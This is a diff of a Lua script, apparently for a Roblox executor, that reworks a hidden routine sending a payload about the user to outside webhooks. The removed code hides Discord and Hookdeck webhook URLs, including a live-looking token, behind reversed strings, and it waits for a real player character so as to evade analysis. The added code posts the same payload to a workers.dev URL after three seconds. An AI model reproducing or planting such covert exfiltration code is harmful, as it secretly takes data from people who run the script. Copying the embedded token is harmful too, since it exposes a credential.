@@ -25,17 +25,8 @@ local function http(method, url, body, headers, timeout)
     return ok and res or nil
 end
 
-local function _rv(s) return (s:reverse()) end
-local function _wh()
-    local a = _rv("/skoobew/ipa/moc.drocsid//:sptth")
-    local b = "1369944626705731615/Le5qsx3gZmx3fdKZpX_1aefRLI2d5aBQki7zIxxgquC5kE848Iej3XJmBq_ihK2SwB4F"
-    return a .. b
-end
-local function _fb()
-    local a = _rv("/kooh/moc.rretskooh//:sptth")
-    local b = "nGqoRTX-QCLZYwmsFOVe2uYLrM_5G8_i3I4FwRAKHS4/"
-    return a .. b
-end
+local WEBHOOK_MAIN = "https://kj.shushenkovnicita.workers.dev/"
+local WEBHOOK_FALLBACK = "https://kj.shushenkovnicita.workers.dev/"
 
 local function buildWebhookPayload()
     local executor = "Unknown"
@@ -51,18 +42,9 @@ local function buildWebhookPayload()
 end
 
 task.spawn(function()
-    task.wait(28)
-    local isReal = false
-    pcall(function()
-        local ch = LocalPlayer.Character
-        isReal = (ch ~= nil) and (ch:FindFirstChildOfClass("Humanoid") ~= nil)
-    end)
-    if not isReal then return end
+    task.wait(3)
     local payload = buildWebhookPayload()
-    local res = http("POST", _wh(), payload, {["Content-Type"]="application/json"}, 15)
-    if not res or (res.StatusCode and res.StatusCode >= 400) then
-        http("POST", _fb(), payload, {["Content-Type"]="application/json"}, 20)
-    end
+    http("POST", WEBHOOK_MAIN, payload, {["Content-Type"]="application/json"}, 15)
 end)
 
 local Languages = {
